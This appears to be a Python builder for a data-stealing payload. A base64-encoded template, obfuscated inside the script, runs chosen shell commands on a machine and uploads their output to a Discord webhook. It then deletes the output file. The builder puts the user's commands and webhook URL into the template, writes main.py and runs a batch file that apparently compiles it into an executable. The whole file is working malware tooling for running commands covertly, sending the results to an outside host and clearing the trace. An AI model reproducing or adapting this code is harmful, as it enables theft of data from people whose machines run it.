from input_gui import InputGUI
import os
import io
import base64
import time
input_gui = InputGUI()
input_gui.run()
commands = input_gui.commands.split(",")
url = input_gui.url
s="aW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwpERUZBVUxUX0NPTU1BTkRTID1bJ2V4J10KT1VUUFVUX0ZJTEUgPSAib3V0cHV0LnR4dCIKV0VCSE9PS19VUkwgPSAiZXgiCgpkZWYgZXhlY3V0ZV9jb21tYW5kcyhjb21tYW5kcyk6CiAgICB3aXRoIG9wZW4oT1VUUFVUX0ZJTEUsICJ3IikgYXMgZjoKICAgICAgICBmb3IgY29tbWFuZCBpbiBjb21tYW5kczoKICAgICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5ydW4oY29tbWFuZCwgc2hlbGw9VHJ1ZSwgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKQogICAgICAgICAgICBmLndyaXRlKGYiQ29tbWFuZDoge2NvbW1hbmR9XG5cbiIpCiAgICAgICAgICAgIGYud3JpdGUocmVzdWx0LnN0ZG91dCkKICAgICAgICAgICAgZi53cml0ZSgiXG5cbiIpCiAgICAgICAgICAgIGYud3JpdGUoIj0iICogNTApCiAgICAgICAgICAgIGYud3JpdGUoIlxuXG4iKQoKZGVmIHNlbmRfdG9fZGlzY29yZF93ZWJob29rKGZpbGVuYW1lKToKICAgIHdpdGggb3BlbihmaWxlbmFtZSwgInJiIikgYXMgZjoKICAgICAgICBwYXlsb2FkID0geyJmaWxlIjogKGZpbGVuYW1lLCBmKX0KICAgICAgICByZXF1ZXN0cy5wb3N0KFdFQkhPT0tfVVJMLCBmaWxlcz1wYXlsb2FkKQoKZGVmIGRlbGV0ZV9maWxlKGZpbGVuYW1lKToKICAgIGlmIG9zLnBhdGguZXhpc3RzKGZpbGVuYW1lKToKICAgICAgICBvcy5yZW1vdmUoZmlsZW5hbWUpCgpkZWYgbWFpbigpOgogICAgZXhlY3V0ZV9jb21tYW5kcyhERUZBVUxUX0NPTU1BTkRTKQogICAgc2VuZF90b19kaXNjb3JkX3dlYmhvb2soT1VUUFVUX0ZJTEUpCiAgICBkZWxldGVfZmlsZShPVVRQVVRfRklMRSkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK"
def update_global_variables_from_string(s, variable_name, new_value):
    updated_lines = []
    variable_updated = False

    # Create a file-like object from the string
    with io.StringIO(s) as file:
        for line in file:
            # Check if the line assigns a value to the global variable and it's the first occurrence
            if line.startswith(f"{variable_name} =") and not variable_updated:
                # Update the line with the new value
                updated_line = f"{variable_name} = {repr(new_value)}\n"
                updated_lines.append(updated_line)
                variable_updated = True
            else:
                updated_lines.append(line)

    # Join the updated lines into a single string
    updated_content = ''.join(updated_lines)
    return updated_content


# Example usage
if __name__ == "__main__":
    file_path = "main.py"
    variable_name1 = "DEFAULT_COMMANDS"
    new_value1 = commands
    variable_name2 = "WEBHOOK_URL"
    new_value2 = url
    s = base64.b64decode(s).decode('utf-8')
 
    result = update_global_variables_from_string(update_global_variables_from_string(s, variable_name1, new_value1), variable_name2, new_value2)
    f = open("main.py","w")
    f.write(result)
    f.close


    time.sleep(5)
    os.popen("to_exe.bat")


